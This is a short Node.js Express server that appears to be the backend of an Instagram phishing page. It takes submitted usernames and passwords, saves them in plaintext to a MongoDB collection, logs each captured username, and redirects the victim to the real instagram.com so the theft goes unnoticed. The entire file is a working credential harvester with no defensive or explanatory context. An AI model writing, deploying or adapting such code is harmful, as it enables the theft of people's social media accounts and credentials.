require("dotenv").config();
const express = require("express");
const { MongoClient } = require("mongodb");
const cors = require("cors");
const path = require('path');
const bodyParser = require("body-parser");

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'frontend'))); // 👈 Serve frontend

const client = new MongoClient(process.env.MONGO_URI);
let db;

async function connectDB() {
  try {
    await client.connect();
    db = client.db("insta_app_db");
    console.log("✅ Connected to MongoDB");
  } catch (err) {
    console.error("❌ DB connection error:", err);
  }
}
connectDB();

app.post("/", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ message: "Missing username or password" });

  try {
    await db.collection("users").insertOne({
      username,
      password,
      createdAt: new Date(),
    });
    console.log("📦 Data saved:", username);
    return res.redirect("https://www.instagram.com");
  } catch (err) {
    console.error("❌ Error saving data:", err);
  }
});

app.listen(port, () => console.log(`🚀 Server running on http://localhost:${port}`));
